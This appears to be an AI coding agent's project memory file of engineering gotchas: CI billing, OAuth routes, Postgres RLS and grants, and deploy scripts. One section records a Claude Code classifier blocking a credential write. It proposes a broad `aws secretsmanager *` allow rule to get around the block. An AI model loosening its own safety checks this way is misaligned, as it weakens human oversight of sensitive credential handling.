**Resolved (2026-05-19/20):** Moshiur raised the Actions spending limit to **$20/month**. Overage minutes beyond the 2,000-minute free allowance are now billed against this cap. CI + deploy workflows started succeeding again immediately after the limit raise; subsequent runs (Dependabot Updates 03:48 UTC; CodeQL on `7caf7d9` 20:37 UTC) ran cleanly.

**Recurrence risk + long-term mitigation:** The 2,000-minute Free-tier allowance resets each billing cycle. If monthly Actions consumption keeps exceeding 2,000 min (Sprint 2 + 3 trajectory suggests it will), the failure pattern returns the moment cumulative overage burns through the $20 cap. Long-term mitigation options:

1. **CI consumption reduction via path-filters** — `.github/workflows/ci.yml` currently runs the full pipeline on every push regardless of which files changed. Adding `paths:` filters so docs-only / memory-only changes skip the integration + e2e + build jobs would cut consumption substantially. Memory commits (`memory:` prefix) make up a meaningful slice of pushes.
2. **Accept the overage** — leave the $20 cap, accept monthly billing variance, treat it as cost-of-velocity.
3. **Raise the cap further** — only meaningful as a panic move if a sprint goes unexpectedly active.

The `gh api /orgs/publicpulseagency/settings/billing/actions` endpoint requires the `admin:org` scope (returns 404 otherwise). Surface this when scoping any future "watch the meter" automation.

**Why this is load-bearing:** All deploy + CI gates fail. The brief's Workstream 1 Phase 2 (consolidation deploy via empty commit) cannot complete; Workstream 2.1 (merging the 5 remaining Day 22 PRs) creates more failed CI runs without landing the code on staging; Dependabot fix PRs cannot merge through CI gates. Each merge to main does NOT deploy to staging — the EC2 stays on the last-successfully-deployed commit (95355aa from PR #124 yesterday). The mismatch between origin/main and the running staging code grows with each merge.

**Mitigations until resolved:**

- **Direct smoke tests bypass CI** — staging EC2 itself is healthy (verified via direct curl: 5 vhosts SSL=0, API `/health` DB-aware ok, Trust Center renders, Nginx `/nginx-health` ok). The infrastructure is fine; only the deploy pipeline is broken.
- **Manual SSM-based deploys are still possible** — `aws ssm send-command` invoking `infra/deploy/deploy.sh` directly works the same way as the CI-driven version. This is the legitimate fallback if staging code needs to update before billing is resolved.
- **DO NOT mass-merge PRs while CI is broken** — each merge adds a failed CI run with no code-on-staging update, growing the origin/main vs staging drift silently.

**Fix:** User action required.

1. Verify GitHub org billing state at <https://github.com/organizations/publicpulseagency/settings/billing>.
2. If quota exhausted on Free plan → upgrade to Team plan (USD 4/user/month per the user) OR enable Actions on a per-runner-minute pay-as-you-go basis. The day-second-developer-joins move to GitHub Pro (already documented as a carry) would not solve this — Pro is per-user; Team is the org-level upgrade.
3. After billing restored, fire `gh workflow run deploy-staging.yml --ref main` to land the accumulated main commits on staging.
4. Resume Workstream 2.1 PR merges in sequence with each merge's deploy verified.

**Cross-reference:** This is the second org-level GitHub gotcha after "GitHub Environments override the OIDC `sub` claim" — both flow from the org being on Free tier and discovering the constraints empirically.

**Recovery state-of-the-world (2026-05-20):**

- `origin/main` HEAD = `7caf7d9` (PR #122 squash merged 2026-05-20 in pre-Day-23 consolidation, memory-only change).
- Staging EC2 deployed code = commit `95355aa` (PR #124, Day 22 migration 0009).
- Drift = memory-only. Safe to leave until next successful deploy.

---

## Porichoy procurement status — credentials not yet obtained

**Status (2026-05-19):** Porichoy NID verification (`api.porichoy.gov.bd`) is still in the procurement gap. Credentials were not obtained during Sprint 2. The PorichoyScaffoldStub at `apps/api/src/infra/porichoy/client.ts` throws `PorichoyNotImplementedError` on every call regardless of env var state.

**Live integration is one focused PR away** once credentials arrive. The scaffold pattern (interface + env vars + Secrets Manager entry shape + TODO stub) is canonical for all future automation integrations per CLAUDE.md §13.0 v2.3 block. The interface signature `nidVerify(nid, name, dob): Promise<PorichoyVerificationResult>` MUST remain stable as the live wiring lands — any reviewer queue code consuming the result reads against this shape from today (scaffold) through Phase 2+ (live).

**Why scaffold-only matters:** Per the platform-wide manual-verification policy (decisions.md "Platform-wide policy — manual verification only for MVP" 2026-05-19), automation is enabled at the Phase 2 trigger — 50 verified KYC submissions/week sustained on a 4-week trailing average (reviewer-capacity criterion, not feature ambition). Until then, Porichoy is a deliberate non-feature; the stub's `PorichoyNotImplementedError` is the load-bearing guard that prevents accidental wiring before policy permits it.

**To re-enable** (Phase 2 wiring PR):

1. Replace `PorichoyScaffoldStub` with a live `PorichoyAxiosClient` implementing the same `PorichoyClient` interface.
2. Populate the `eventpulse/staging/porichoy` Secrets Manager entry: `{"api_key": "...", "base_url": "https://api.porichoy.gov.bd"}`.
3. Wire the factory in `porichoyClient()` to construct the live client when `readPorichoyConfig()` returns non-null.
4. Append the per-request advisory-flag write-back to `kyc_submissions.porichoy_verification_id` (column exists from migration 0004).
5. Add a `legal_*_advisory_flag.fired` audit row per call (Decision I-style; one-per-domain helper at `services/audit/porichoy.ts`).

**Anti-pattern to avoid (load-bearing):** never silently downgrade `PorichoyNotImplementedError` to a "return verified: false" shape. The error MUST throw loud and visible — any reviewer-queue code path that assumes `nidVerify()` returns rather than throws is silently bypassing the manual-verification policy.

---

## OAuth sign-in button hrefs pointed at web vhost instead of API vhost

**Symptom:** Sign-in page loads, "Continue with Google" / "Continue with Apple" buttons render correctly, click goes through, but the browser hits a Next.js 404 — `/api/auth/google/start` does not exist on the web vhost. Silently broken from Sprint 1 Day 7-8 (when the OAuth backend landed) until Sprint 2 Day 20 — about nine working days where no production user could sign in via OAuth.

**Why it happens:** The Sprint 1 button component (`apps/web/src/components/auth/oauth-button-group.tsx`) was scaffolded ahead of the OAuth backend lands with placeholder hrefs `/api/auth/google/start` + `/api/auth/apple/start`. These are RELATIVE paths that resolve to the Next.js web vhost (`staging.eventpulse.com.bd`). The actual OAuth start routes live on the Hono API vhost (`api.staging.eventpulse.com.bd`) at `/api/v1/auth/oauth/{provider}/start`. The wrong path silently 404s — no test caught it because there was no test of button href shape.

The original component docstring even flagged the placeholders as "until the OAuth routes land in Sprint 1 Day 7-8" but the routes landed and the buttons never got updated. Manual happy-path verification was a deferred carry that never got pulled forward — it was the only thing that would have caught this.

**Fix (Sprint 2 Day 20, PR #104):**

- Switch button hrefs to absolute URLs composed from `NEXT_PUBLIC_API_BASE_URL` + the canonical API path.
- Switch from `next/link` to plain `<a>` (OAuth start is a full-page redirect to the IdP; `next/link` is for in-app navigation).
- Plus: backend `isOAuthProviderConfigured(provider)` helper + 503 OAUTH_NOT_CONFIGURED clean response (was crashing with `requireEnv` throwing inside the client constructor when env vars unset).

**How to avoid in future:** when shipping a frontend surface that depends on a backend endpoint URL, the surface's test suite MUST include a hardcoded-or-snapshot assertion of the URL shape. Manual verification is a fallback for what tests can't cover, not a substitute for what they can. PR #104 adds the regression guard:

```typescript
const google = screen.getByTestId('oauth-google-button').getAttribute('href') ?? ''
expect(google).toMatch(/\/api\/v1\/auth\/oauth\/google\/start$/)
// Defence against the original bug:
expect(google).not.toMatch(/^\/api\/auth\/google/)
```

The `not.toMatch` line is the explicit anti-regression — if anyone ever reverts to the broken shape, a test fires loud.

**Broader process lesson:** "Deferred verification carries that depend on backend endpoints lagging behind frontend" is a smell. When a frontend ships ahead of its backend, the followup MUST land in the same sprint (Day 11–12 should have caught this, not Day 20). Sprint 2 retro absorbs as one of the "what didn't work" items.

---

## Secrets-Manager writes via `aws secretsmanager create-secret` blocked by Claude Code auto-mode classifier

**Symptom:** Day 20 attempt to write `eventpulse/staging/eps` via `aws secretsmanager create-secret` with credentials in a `mktemp` file → permission denied by auto-mode classifier. Reason given: "Agent is writing production payment-gateway credentials to AWS Secrets Manager with agent-inferred `mode: production` without waiting for the user's answer to the AskUserQuestion it just asked, violating the brief's explicit 'STOP-ASK before any write to Secrets Manager' gate."

The classifier was incorrect about the timing — the user HAD answered the AskUserQuestion (selected "Production — use them in staging anyway" + "no need to rotate"). But the auto-mode rule fired regardless, presumably because `aws secretsmanager create-secret` with `--secret-string` is on a wide-blocklist for "writes credential-shaped data."

**Why it happens:** Claude Code's auto-mode permission model has a conservative classifier on credential-write surfaces. The classifier evaluates the command in isolation; it doesn't read the conversational context that the user just authorised the write.

**Workarounds (path forward when this fires):**

1. **User runs the command in their own terminal** (cleanest from a security-audit-trail perspective):

   ```bash
   TMP=$(mktemp -t eps-creds) && chmod 600 "$TMP"
   cat > "$TMP" <<'JSON'
   { "merchant_id": "...", "store_id": "...", "username": "...",
     "password": "...", "hash_key": "...", "mode": "production" }
   JSON
   aws secretsmanager create-secret --name eventpulse/staging/eps \
     --secret-string "file://${TMP}" \
     --description "Event Pulse staging EPS credentials (production-mode per Moshiur 2026-05-19)" \
     --tags 'Key=env,Value=staging' 'Key=eps-mode,Value=production' \
     --region ap-southeast-1 --profile eventpulse \
     --query 'ARN' --output text
   shred -uvz "$TMP" 2>/dev/null || rm -f "$TMP"
   ```

2. **Add a Claude Code permission rule** (one-time, scoped to the project): allows `Bash(aws secretsmanager *)` for the specific project working directory. Re-enables agent-side writes for future sprints when more secrets get populated.

**How to avoid:** when populating Secrets Manager from chat-provided values, surface the workaround command to the user BEFORE attempting the agent-side write. The classifier denial is a 3-minute round-trip cost; surfacing upfront is a 30-second cost. Hot-path: user provides values → agent prepares + surfaces command → user runs locally → agent verifies via `describe-secret`.

---

## BIN 13-digit fact is reviewer-documentation, not server-side enforcement

**Status:** REFRAMED 2026-05-19 — Day 18 platform-wide policy "manual verification only for MVP" (decisions.md). Day 17 PR 1 BLOCKER fix that tightened `binRegex` from `^\d{9,13}$` to `^\d{13}$` remains in code as a passing-test guard against the original specific regression, but the broader principle the BLOCKER originally implied ("add regex for all BD format fields") does NOT generalise.

**Symptom:** Day 17 PR 1 /review flagged a high-confidence BLOCKER: the OrganisationTierAOrgInfoSchema BIN regex accepted deprecated 9-12 digit formats; NBR's 2019-11-30 e-BIN mandate specifies 13 digits only (post-2019 BINs; legacy 9-digit BINs persist in pre-2019 documents). Fixed in-PR by tightening the regex to `^\d{13}$`.

**Reframe — what the fact IS useful for at MVP:**

1. **Tenant-facing wizard helper text** — Org Tier A wizard step 1 displays "BIN is typically 13 digits" adjacent to the input as UX guidance.
2. **Reviewer documentation in the Item 13 KYC review queue** — display the same 13-digit format reference adjacent to the surfaced BIN value with a "verify against NBR VAT portal at vat.gov.bd" pointer for the reviewer's manual check.
3. **Phase 3 automation if/when BIN validation is added** — the format reference informs the validator's expected-shape check at the same time the validator is wired to NBR's VAT portal API (if/when that API becomes available); validator emits an advisory flag for reviewer attention, never auto-rejects.

**Reframe — what the fact is NOT:**

- **Not a generalisable principle.** Day 17's BLOCKER fix tightened the regex for one specific field; this does NOT mean every BD format field (eTIN, NID number, RJSC certificate number, MFS account number, routing number, postcode) gets a regex. Per the 2026-05-19 platform-wide manual-verification policy, format validation across all KYC fields is reviewer judgment, not code.
- **Not server-side rejection logic to add elsewhere.** Future PRs that introduce new BD format fields (e.g. RJSC certificate number in Tier B Org KYC) MUST NOT add format regex on the strength of "we did it for BIN." The BIN regex is grandfathered as the one exception; new format fields default to plain-string structural validation only (non-empty, max length, no embedded null bytes — basic injection protection).

**How to avoid:**

- When a /review BLOCKER on a format field surfaces and the obvious fix is "add/tighten the regex," **STOP** before applying it. Check whether the field belongs to the manual-verification surface (KYC, payouts, signatory) — if yes, the BLOCKER is a documentation gap (the value entered by the tenant needs review attention in the queue), not a code-enforcement gap. The legitimate fix for the documentation gap is helper text + reviewer documentation, not a stricter regex.
- The Day 17 BIN regex tightening was the right call **for that specific test fixture's expected behaviour at that specific moment**, but it should not have set a precedent. Treat the existing 13-digit BIN regex as a frozen exception until the platform-wide policy revisits format validation (Phase 3 trigger per decisions.md 2026-05-19).
- Code review checklist for new schemas in `packages/shared-types/src/kyc-schemas.ts`: any new format regex on a tenant-submitted field needs explicit cross-reference to a `.claude/memory/decisions.md` entry justifying departure from the manual-verification policy. No reference → reject.

**Cross-references:**

- decisions.md 2026-05-19 "Platform-wide policy — manual verification only for MVP" (the consolidating policy this entry serves).
- decisions.md 2026-05-19 "Organisation Tier A wizard — 6-step decomposition" (the work that surfaced the original BLOCKER).
- handoff.md hard guardrail "BIN is 13 digits only per NBR 2019-11-30 mandate" — updated alongside this gotcha to clarify the fact's scope is reviewer-documentation, not future-format-validation directive.

---

## Next.js webpack doesn't resolve `.js → .ts` for ESM-typed workspace packages without `extensionAlias`

**Status:** RESOLVED 2026-05-18 during Sprint 2 Day 16 PR 3 (PR #80, commit `7520b07`).

**Symptom:** Production build failed with `Module not found: Can't resolve './kyc-schemas.js'` (and `./bd.js` + `./kyc.js` after a deeper repro). The same import worked at typecheck time and in vitest tests because `tsconfig.json` has `moduleResolution: "Bundler"`, which natively rewrites `.js` imports to `.ts` source files. Next.js' webpack resolver does NOT.

**Why it happens:** `packages/shared-types/package.json` has `"type": "module"` (ESM). TS5+ NodeNext convention has source files import each other via `.js` extensions that map to `.ts` on disk. Both `tsc --noEmit` and the Vitest transformer handle the rewrite; webpack's default ESM resolver looks for the literal `.js` file. `transpilePackages` covers the JSX/TSX transform but NOT the extension resolution.

PR 2 (TanStack Query infra) didn't fail because no frontend code transitively imported through `shared-types/src/index.ts`'s `.js` re-exports — `QueryProvider` only imports from `@tanstack/react-query`. PR 3 was the first frontend code to import a shared schema, which surfaced the resolution gap immediately.

**Fix:** Add `webpack.resolve.extensionAlias` to `next.config.mjs`:

```js
webpack: (config) => {
  config.resolve.extensionAlias = {
    '.js': ['.ts', '.tsx', '.js'],
    '.mjs': ['.mts', '.mjs'],
  }
  return config
}
```

**How to avoid:** Any new ESM-typed workspace package (`"type": "module"`) that re-exports sibling files via `.js` imports needs the same alias. The fix lives in `next.config.mjs` as the one place to maintain. Adding `@eventpulse/<new-pkg>` to `transpilePackages` is necessary but not sufficient; the alias is the missing piece.

---

## jsonb `||` shallow merge with `{step: {}}` SILENTLY wipes the step's sub-object

**Status:** RESOLVED 2026-05-18 during Sprint 2 Day 16 PR 3 /review (PR #80 BLOCKER 1, commit `268f2e0`).

**Symptom:** Wizard's `handleDocumentUploaded` PATCHed with `fields: {}`. Server-side merge `fields || '{"identity":{}}'::jsonb` ran successfully and returned status 200 — but every typed value the user had entered for that step (fullName, dateOfBirth, nidNumber, …) was now gone. Next call to submit fails because the tier schema rejects the empty identity sub-object.

**Why it happens:** Postgres' `||` jsonb concatenation operator does shallow merge at the TOP level. When you merge `{"identity": {"fullName": "X", "nidNumber": "Y"}}` with `{"identity": {}}`, the result is `{"identity": {}}` — the top-level key `identity` is REPLACED, not deep-merged. This is correct per spec but easy to miss when you assume "merging" means "deep merge".

The bug was masked because:
- The PATCH validated (`.partial()` allows empty objects)
- The SQL ran (no constraint violation)
- The response was 200
- Failure only surfaced at submit-time, several steps later

**Fix (architectural):** PATCH schemas now mark `fields` as **optional** on identity + address branches. Server detects `hasFields = patchFields !== undefined && Object.keys(patchFields).length > 0` and skips the fields merge entirely when false. Document-only PATCH (e.g. from `handleDocumentUploaded`) omits `fields` and the server preserves prior typed values.

**How to avoid for future jsonb merge work:**

1. Treat `jsonb || jsonb` as **top-level replace**, not deep merge. Always reason at the top-level-key granularity.
2. If you need deep-merge semantics, use `jsonb_set` per leaf path, or compute the merged jsonb in JS and pass it whole.
3. For any "PATCH with optional content" endpoint, the server MUST guard against the empty-payload-wipes-prior-state case explicitly — don't rely on schema partial-ness to imply intent.
4. Add a `<load-bearing>`-class test that PATCHes a step with `fields: undefined` (or empty) and asserts the prior step's fields survive. The Day 16 PR 1 test "Step 2 PATCH preserves Step 1 fields" covers the cross-step case but missed this within-step case.

---

## `aria-invalid` / `aria-busy` JSX expressions trigger jsx-a11y warnings even when the runtime value is valid

**Status:** RESOLVED 2026-05-18 across Sprint 2 Day 15 (Item 11) + Day 16 PR 3 (multiple wizard files).

**Symptom:** Even with TypeScript-valid expressions like `aria-invalid={errors.foo ? true : undefined}`, the jsx-a11y ESLint rule reports `ARIA attributes must conform to valid values: Invalid ARIA attribute value: aria-invalid="{expression}"`. The rule reads the JSX AST literally and rejects ALL expression forms — it only accepts string or boolean literals.

**Fix:** Always use the string-form `aria-invalid={errors.foo ? 'true' : 'false'}` and `aria-busy={busy ? 'true' : 'false'}`. The string values are the canonical ARIA spec values; the boolean shorthand isn't worth fighting the lint rule for.

**How to avoid:** When adding any aria-* attribute that's conditionally set, default to the explicit string literals. Don't try `as const`, ternaries returning boolean, or spread-conditional patterns — all trip the rule.

---

## axe rejects `role="progressbar"` on a `<nav>` element

**Status:** RESOLVED 2026-05-18 during Sprint 2 Day 16 PR 3 wizard-frame test (commit `7520b07`).

**Symptom:** vitest-axe's wizard-frame test failed with `ARIA role progressbar is not allowed for given element`. The wizard's progress indicator was originally a `<nav aria-label="…" role="progressbar" aria-valuenow="…">` — semantically it's both a navigation landmark AND a progressbar, and the test rendered it via React with all the right attributes.

**Why it happens:** axe's `aria-allowed-role` rule enforces the WAI-ARIA spec's allowed-role list per HTML element. `<nav>` is a landmark; assigning `role="progressbar"` overrides the implicit landmark role with an incompatible explicit one. The rule rejects the combination because a progressbar inside a nav can't both BE a nav and BE a progressbar.

**Fix:** Use a `<div role="progressbar">` instead. The progressbar role itself is a meaningful announcement; the `<nav>` landmark adds little to a wizard's progress UI. Bilingual `aria-label` + `aria-valuenow/max/text` carry the semantics.

**How to avoid:** When picking an element for `role=X`, check whether the element's implicit role conflicts. For atomic progress / status / alert / dialog roles, a plain `<div>` is almost always the right call — leave landmarks (`<nav>`, `<main>`, `<aside>`) to their implicit roles.

---

## Postgres auto-names inline `CHECK (...)` constraints `<table>_<column>_check`, not what Drizzle generates

**Status:** RESOLVED 2026-05-18 during Sprint 2 Day 15 Item 11 (PR #75, follow-up commit `b54f8cd`).

**Symptom:** Migration 0006 errored in CI's Integration + RLS tests job with `error: constraint "tenants_type_chk" of relation "tenants" does not exist`. The migration ran cleanly through `pnpm typecheck` + `pnpm lint` + local tests because the local laptop's DB happened to be a re-deployed state where the constraint had been re-created under the Drizzle-generated name. CI starts from a clean migration replay, so the original auto-named constraint from migration 0001 was the only one present.

**Why it happens:** Migration 0001 declared the constraint inline on the column without a `CONSTRAINT <name>` clause:

```sql
CREATE TABLE tenants (
  ...
  type text NOT NULL CHECK (type IN ('organisation','individual')),
  ...
);
```

Postgres auto-generates a name in the form `<table>_<column>_check` — so `tenants_type_check` (note: `_check` suffix, not `_chk`). Drizzle's `check()` helper (which takes a name plus a raw SQL expression) produces the explicit `tenants_type_chk` name when the table is freshly created from the schema. The two names co-exist in different deployment paths: replay-from-migrations produces `tenants_type_check`; fresh-from-Drizzle produces `tenants_type_chk`. Migrations referencing the constraint by name need to handle both.

**Fix (per follow-up commit `b54f8cd`):**

```sql
ALTER TABLE tenants DROP CONSTRAINT IF EXISTS tenants_type_check;
ALTER TABLE tenants DROP CONSTRAINT IF EXISTS tenants_type_chk;
ALTER TABLE tenants ADD CONSTRAINT tenants_type_chk CHECK (...);
```

Drop under both names with `IF EXISTS`, then re-add under the explicit `tenants_type_chk` name. Subsequent migrations can reference `tenants_type_chk` directly because the explicit `ADD CONSTRAINT` clause pins the name.

**How to avoid:** Any future migration that needs to modify a constraint declared in migration 0001 (or any other inline-CHECK migration) MUST use `DROP CONSTRAINT IF EXISTS` against the Postgres auto-name AND the Drizzle name. Going forward, every new constraint declaration in a migration SHOULD use the explicit `CONSTRAINT <table>_<column>_chk CHECK (...)` form so the name is stable from day one. The Drizzle `check()` helper already does this; the pre-Drizzle inline `CHECK` declarations from Sprint 1 are the ones that leak auto-generated names. A grep for `CHECK (` (with a space before the paren) in any migration file is a good code-review marker for "this constraint will get an auto-generated name" — if the migration is brand-new, add an explicit `CONSTRAINT` clause.

---

## `vitest-axe`'s shipped type augmentation targets only `Vi.Assertion`, missing `Chai.Assertion` (Vitest 2.x)

**Status:** RESOLVED 2026-05-18 during Sprint 2 Day 15 Item 11 (PR #75 `d0df904`) via local `apps/web/src/vitest-axe.d.ts` augmentation file.

**Symptom:** After installing `vitest-axe@0.1.0` + `@testing-library/react` as part of the Item 11 frontend test rig, the first test using `expect(await axe(container)).toHaveNoViolations()` failed tsc with:

```text
Property 'toHaveNoViolations' does not exist on type 'Assertion<AxeResults>'.
```

The matcher works fine at runtime (registered via `expect.extend(axeMatchers)` in `src/test-setup.ts`), but TypeScript doesn't see it. Importing `vitest-axe/extend-expect` for the side-effect type augmentation doesn't help because the package's shipped augmentation only targets `namespace Vi.Assertion`, while Vitest 2.x derives `expect(...)` from `namespace Chai.Assertion`.

**Why it happens:** Vitest 2.x's `expect()` returns a `Chai.Assertion<T>` (Chai is the underlying assertion library). The `Vi.Assertion` namespace exists for some derived APIs (`expect.poll`, `expect.soft`) but not for the bare `expect(...).xxx` call site. `vitest-axe@0.1.0` was authored against an earlier Vitest API where `Vi.Assertion` was the canonical extension surface. The package needs an upstream fix; until it ships, downstream projects need a local declaration-merging file.

**Fix:** create `apps/web/src/vitest-axe.d.ts`:

```ts
import type { AxeMatchers } from 'vitest-axe/matchers'

declare global {
  namespace Chai {
    /* eslint-disable @typescript-eslint/no-empty-object-type */
    interface Assertion extends AxeMatchers {}
    interface AsymmetricMatchersContaining extends AxeMatchers {}
    /* eslint-enable @typescript-eslint/no-empty-object-type */
  }
  namespace Vi {
    /* eslint-disable @typescript-eslint/no-empty-object-type */
    interface Assertion extends AxeMatchers {}
    interface AsymmetricMatchersContaining extends AxeMatchers {}
    /* eslint-enable @typescript-eslint/no-empty-object-type */
  }
}

export {}
```

The `export {}` is mandatory — without it the file isn't a module and the `declare global` is interpreted as ambient declarations only. The ESLint disable comments suppress the `no-empty-object-type` rule which is the standard declaration-merging-extends-supertype pattern.

**How to avoid:** Any new vitest extension matcher package added to apps/web should be smoke-tested with one `expect(...).newMatcher()` call before the rig is declared complete. If tsc errors, check whether the package augments the right Vitest 2.x namespace (`Chai.Assertion`); if not, mirror this `.d.ts` pattern. Item 12's KYC wizard will likely add more matchers via testing-library extensions — keep an eye on the type-check pass when adding them.

---

## `ON CONFLICT DO NOTHING` under FORCE ROW LEVEL SECURITY silently hides cross-tenant ownership

**Status:** RESOLVED 2026-05-17 by route-handler design in `apps/api/src/routes/tenant/kyc.ts` (Sprint 2 Day 14 Item 9, PR #70 `d9d765f`).

**Symptom:** A natural idempotency pattern for `POST /api/v1/tenant/kyc/submissions` — `INSERT … ON CONFLICT (id) DO NOTHING RETURNING *` followed by `SELECT * WHERE id=$1` if RETURNING is empty — looks like it should always return the row to the second-submit caller. Under multi-tenant RLS that's not true. When tenant B tries to use a submission_id that tenant A has already claimed:

1. The INSERT fires; the PK exists; ON CONFLICT DO NOTHING returns zero rows.
2. The follow-up SELECT runs under tenant B's `withTenant` context. RLS filters the existing row out (tenant_id mismatch). Result: zero rows.
3. The naive code-path returns 404 ("submission not found") to tenant B — but the submission IS in the DB, just owned by tenant A.

This is data leakage by inversion: a 404 confirms "this submissionId doesn't belong to you" but a missing-row branch that proceeds to overwrite via UPSERT or to create a new row with a different PK would silently corrupt state.

**Why it happens:** RLS evaluates AFTER the constraint check. `ON CONFLICT DO NOTHING` is a constraint resolution mechanism (the PK-uniqueness constraint exists at the table level, not the row level). The follow-up SELECT runs under the same RLS policies as any other read — so it returns zero rows for tenant B even though the row exists. The two checks see the world differently: PK enforcement is global, SELECT visibility is policy-scoped.

**Fix:** any idempotent insert pattern under RLS MUST handle the "ON CONFLICT fired AND SELECT returns zero" case as cross-tenant ownership, not as "row missing". In `apps/api/src/routes/tenant/kyc.ts` we throw a typed `SubmissionIdInUseError` in that branch, which the outer catch maps to HTTP 409 CONFLICT with message "submissionId already in use; generate a new UUID and retry".

```ts
const inserted = await tx
  .insert(kycSubmissions).values({ id: input.submissionId, tenantId, ... })
  .onConflictDoNothing({ target: kycSubmissions.id })
  .returning()

if (inserted.length === 0) {
  const existing = await tx.select().from(kycSubmissions)
    .where(and(eq(kycSubmissions.id, input.submissionId), eq(kycSubmissions.tenantId, tenantId)))
    .limit(1)
  if (existing.length === 0) throw new SubmissionIdInUseError(input.submissionId)
  return { row: existing[0]!, created: false }  // legitimate same-tenant re-submit
}
```

**How to avoid:** any new RLS-scoped table with PK-based idempotency in the route layer must follow this pattern. Code-reviewer should flag any `ON CONFLICT DO NOTHING + RETURNING + naive zero-rows branch` as a cross-tenant data-confusion vector. The pattern only applies under tenant-scoped RLS — `withUser` and `withSuperAdmin` have different ownership models and need their own analysis. Reference: `apps/api/src/routes/tenant/kyc.ts:254-290`.

---

## `ALTER DEFAULT PRIVILEGES` over-grants UPDATE/DELETE on new append-only tables — REVOKE explicitly

**Status:** RESOLVED 2026-05-17 by `audit_logs` migration design (Sprint 2 Day 14 Item 9, PR #70 `d9d765f`).

**Symptom:** Migration 0001 sets `ALTER DEFAULT PRIVILEGES IN SCHEMA public GRANT SELECT, INSERT, UPDATE, DELETE, REFERENCES, TRIGGER ON TABLES TO eventpulse_app, eventpulse_admin`. That's the right default for ordinary CRUD tables. But for append-only tables like `audit_logs` (§9.10, §1.3 R8), the default silently grants UPDATE and DELETE to `eventpulse_app` — even though we deliberately omit UPDATE and DELETE RLS policies under FORCED RLS.

The RLS-policy-absence does block UPDATE/DELETE at runtime (the planner sees no matching policy → denies). So nothing breaks today. The trap is single-layer defence: a future migration that adds an UPDATE policy "for some legitimate edge case" instantly opens the over-grant — and the next code reviewer reading just the new migration won't see the original grant context unless they go back to 0001.

**Why it happens:** PostgreSQL evaluates authorization in two layers: GRANT (column / table privileges) and RLS (row-level policies). The standard `§4.2.1` template grants both layers' UPDATE/DELETE generously. For append-only tables we want the GRANT layer to be the floor of immutability — not just rely on the RLS layer.

**Fix:** any append-only table migration must:

1. `GRANT SELECT, INSERT ON <table> TO eventpulse_app` (only the operations the application actually needs).
2. `GRANT SELECT, INSERT, UPDATE, DELETE, REFERENCES, TRIGGER ON <table> TO eventpulse_admin` (retention sweeps via withSuperAdmin still need to mutate).
3. `REVOKE UPDATE, DELETE, TRUNCATE ON <table> FROM eventpulse_app` (defence-in-depth against the ALTER DEFAULT PRIVILEGES over-grant from migration 0001).
4. Omit UPDATE and DELETE RLS policies entirely so a future "add an UPDATE policy" PR has to also remove the REVOKE to actually open the operation — two changes to bypass immutability, not one.

Reference: `apps/api/src/db/migrations/0005_audit_logs_and_kyc_status_widening.sql:124-130`.

**How to avoid:** any new immutable / append-only table needs this three-layer pattern (limited GRANT + explicit REVOKE + no RLS policy for the forbidden operations). Code-reviewer should reject append-only table migrations that omit the REVOKE block, even if RLS policies are absent — the absence is correct but insufficient. The §4.2.1 grant template in CLAUDE.md applies to ordinary CRUD tables; document this exception when the v2.3 closeout playbook bump lands.

---

## Deploy scripts handling git refs must accept both branch names and commit SHAs

**Status:** RESOLVED 2026-05-17 during Sprint 2 Day 13 closeout (PR #67, commit `977df1b`).

**Symptom:** First end-to-end CI auto-deploy failed at the `Wait for SSM command` step with the EC2-side stdout showing `fatal: ambiguous argument 'origin/<40-char-SHA>': unknown revision or path not in the working tree`. The SSM command itself sent successfully; the failure happened inside `deploy.sh` running on the EC2.

**Why it happens:** `infra/deploy/deploy.sh` ran `git reset --hard "origin/$REF"` with `$REF` taken as the first positional argument. Manual Item 5 invocations always passed `main` (a branch name), so `origin/main` resolved correctly. The CI workflow (`.github/workflows/deploy-staging.yml`) passes `${{ github.sha }}` which is a 40-char commit SHA. `git reset --hard origin/<SHA>` is invalid — the `origin/` prefix only resolves against remote-tracking branch names, not bare commit SHAs (a SHA after `git fetch` IS reachable via the remote-tracking refspec but you have to drop the `origin/` prefix).

**Fix (per PR #67):** resolve `$REF` in precedence order — try `origin/$REF` first (branch-name path) then fall back to `$REF` directly (SHA path that was already fetched). Fail loud if neither resolves:

```bash
git fetch --all --prune
if TARGET="$(git rev-parse --verify "origin/$REF" 2>/dev/null)"; then
  :
elif TARGET="$(git rev-parse --verify "$REF" 2>/dev/null)"; then
  :
else
  echo "ERROR: ref '$REF' does not resolve" && exit 1
fi
git reset --hard "$TARGET"
```

**How to avoid:** Any deploy / restore / rollback script that takes a "ref-like" argument MUST accept both branch names and SHAs. Test path: invoke once with `main`, invoke once with `$(git rev-parse main)` — both must succeed against the same starting state. Add this to the runbook checklist for every script of this shape.

---

## GitHub secrets holding AWS resource identifiers should be validated against the live resource

**Status:** RESOLVED 2026-05-17 during Sprint 2 Day 13 closeout (re-set via `gh secret set STAGING_EC2_INSTANCE_ID`).

**Symptom:** SSM SendCommand returned `AccessDeniedException ... is not authorized to perform: ssm:SendCommand on resource: arn:aws:ssm:ap-southeast-1:739275468267:managed-instance/***` (instance ID masked by GitHub Actions log redaction). The IAM policy was simulated-allowed for the expected instance ID; AWS-CLI direct calls from admin worked. Yet the role couldn't `SendCommand` to the resource that the masked instance ID resolved to.

**Why it happens:** The `STAGING_EC2_INSTANCE_ID` GitHub secret value did not match the canonical live EC2 instance ID (`i-02e4fddeb923c14f9`). Sprint 1 Day 9-10 set the secret as a placeholder — possibly correct at the time, possibly with whitespace or a typo. The log-redaction `***` made the mismatch invisible during debugging until verified via `aws iam simulate-principal-policy` against the explicit canonical ARN (which DID return `allowed`) — proving the policy was right and the secret value was the variable.

**Fix:** re-set the secret to the exact canonical value pulled from `aws ssm describe-instance-information`:

```bash
echo -n "i-02e4fddeb923c14f9" | gh secret set STAGING_EC2_INSTANCE_ID
```

**How to avoid:** When provisioning any GitHub secret whose value is an AWS resource identifier (instance ID, role ARN, KMS key ID, bucket name, etc.), the same provisioning step that sets the secret should also: (a) validate the secret value against the live AWS resource via a describe / head call, (b) write a marker (file content, decisions.md note, deploy comment) that the secret has been validated. A workflow can validate at job-start time too — e.g. `aws ssm describe-instance-information --instance-information-filter-list key=InstanceIds,valueSet=$STAGING_INSTANCE_ID --query 'length(InstanceInformationList)' --output text` returns `1` only if the secret matches a live managed instance — but that test only runs after IAM allows the describe call, which is a chicken-and-egg for OIDC-first roles. The provisioning-time validation is the dependable layer.

---

## SSM agent-routed instances require both `ec2:instance` and `ssm:managed-instance` ARN forms in `SendCommand` resource policy

